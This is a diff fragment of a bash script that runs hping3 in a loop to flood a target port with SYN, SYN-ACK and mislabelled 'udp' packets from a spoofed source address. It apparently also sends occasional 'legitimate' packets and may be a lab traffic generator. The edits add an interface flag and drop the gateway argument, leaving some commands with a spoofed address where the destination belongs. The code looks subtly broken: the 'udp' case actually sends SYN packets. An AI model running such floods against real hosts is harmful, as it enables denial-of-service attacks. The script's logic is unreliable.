@@ -37,16 +37,16 @@ while true; do
 
   case "$packet_type" in
     udp)
-      hping3 -c 10000 -d "$packet_size" -S --flood -p "$target_port" $spoofed_ip $gateway_ip
+      hping3 -c 10000 -d "$packet_size" -S --flood -p "$target_port" $spoofed_ip --interface eth1 $gateway_ip
       ;;
     syn)
-      hping3 -c 10000 -d "$packet_size" --syn --flood -p "$target_port" $spoofed_ip $gateway_ip
+      hping3 -c 10000 -d "$packet_size" --syn --flood -p "$target_port" --interface eth1 $spoofed_ip 
       ;;
     syn-ack)
-      hping3 -c 10000 -d "$packet_size" -S -A --flood -p "$target_port" $spoofed_ip $gateway_ip
+      hping3 -c 10000 -d "$packet_size" -S -A --flood -p "$target_port" --interface eth1 $spoofed_ip 
       ;;
     legitimate)
-      hping3 -c 1 -d "$packet_size" -p "$target_port" $spoofed_ip $gateway_ip
+      hping3 -c 1 -d "$packet_size" -p "$target_port" $spoofed_ip 
       sleep 1  # Send one legitimate packet per second
       ;;
     *)
